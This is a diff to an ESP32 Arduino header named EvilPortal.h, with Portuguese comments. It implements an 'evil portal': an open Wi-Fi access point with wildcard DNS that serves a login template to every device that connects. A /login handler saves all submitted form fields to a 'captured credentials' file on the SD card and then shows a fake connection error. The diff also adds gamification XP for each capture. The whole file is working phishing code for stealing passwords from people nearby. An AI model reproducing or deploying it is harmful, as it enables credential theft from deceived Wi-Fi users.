@@ -1,6 +1,11 @@
 #ifndef EVIL_PORTAL_H
 #define EVIL_PORTAL_H
 
+/**
+ * EvilPortal.h
+ * Captive Portal com Templates em Português.
+ */
+
 #include <Arduino.h>
 #include <WiFi.h>
 #include <DNSServer.h>
@@ -8,6 +13,7 @@
 #include <SD_MMC.h>
 #include "FaceHandler.h"
 #include "AudioHandler.h"
+#include "Gamification.h"
 
 class EvilPortal {
 private:
@@ -26,68 +32,63 @@ public:
     static void start(const char* ssid, const char* template_file) {
         if (is_running) stop();
 
-        Serial.printf("Iniciando Evil Portal: %s (%s)\n", ssid, template_file);
-        current_template_path = String(template_file);
+        // Templates armazenados em /arquivos_cartao_sd/evil_portal/
+        current_template_path = String("/arquivos_cartao_sd") + String(template_file);
 
-        // 1. AP Mode
+        Serial.printf("[Portal] Iniciando AP '%s' com template '%s'\n",
+                      ssid, current_template_path.c_str());
+
         WiFi.mode(WIFI_AP);
         WiFi.softAP(ssid);
 
-        // 2. DNS Server (Captive Portal - Redirect ALL to IP)
-        // 53 is DNS port
         dnsServer.start(53, "*", WiFi.softAPIP());
 
-        // 3. Web Server
-        // Serve the selected HTML template for root /
         server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
             if (SD_MMC.exists(current_template_path)) {
                 request->send(SD_MMC, current_template_path, "text/html");
             } else {
-                request->send(200, "text/plain", "Erro: Template nao encontrado no SD.");
+                request->send(200, "text/plain",
+                              "Erro: Template nao encontrado no SD (/arquivos_cartao_sd/evil_portal).");
             }
         });
 
-        // Catch-all redirect for captive portal detection (Apple/Android checks)
         server.onNotFound([](AsyncWebServerRequest *request){
             if (SD_MMC.exists(current_template_path)) {
                 request->send(SD_MMC, current_template_path, "text/html");
             } else {
-                request->send(200, "text/plain", "Portal Ativo");
+                request->send(200, "text/plain", "Portal Ativo.");
             }
         });
 
-        // Capture Login
         server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
             String log_entry = "--- Captura: " + String(millis()) + " ---\n";
-
             int params = request->params();
-            for(int i=0;i<params;i++){
+            for(int i = 0; i < params; i++){
                 AsyncWebParameter* p = request->getParam(i);
-                if(p->isPost()){
+                if (p->isPost()) {
                     log_entry += p->name() + ": " + p->value() + "\n";
                 }
             }
 
-            // Save to SD
-            File f = SD_MMC.open("/captured_creds.txt", FILE_APPEND);
+            // Salva em /arquivos_cartao_sd/credenciais_capturadas.txt
+            File f = SD_MMC.open("/arquivos_cartao_sd/credenciais_capturadas.txt", FILE_APPEND);
             if (f) {
                 f.println(log_entry);
                 f.close();
                 captured_count++;
-                Serial.println("CREDENTIAL CAPTURED!");
 
-                // Visual Feedback
+                // Feedback visual + XP
                 FaceHandler::setFace(FACE_HAPPY);
-                AudioHandler::playWav("/success_pt.wav"); // "Yummy!"
+                AudioHandler::playWav("/success_pt.wav");
+                Gamification::addXP(100);
             }
-
-            // Redirect to something harmless or error
-            request->send(200, "text/html", "<h1>Erro de Conexao</h1><p>Tente novamente mais tarde.</p>");
+            request->send(200, "text/html",
+                          "<h1>Erro de Conexao</h1><p>Tente novamente mais tarde.</p>");
         });
 
         server.begin();
         is_running = true;
-        FaceHandler::setFace(FACE_COOL); // Evil/Cool face
+        FaceHandler::setFace(FACE_COOL);
     }
 
     static void stop() {
@@ -96,7 +97,6 @@ public:
             server.end();
             WiFi.softAPdisconnect(true);
             is_running = false;
-            Serial.println("Evil Portal Parado");
             FaceHandler::setFace(FACE_NEUTRAL);
         }
     }
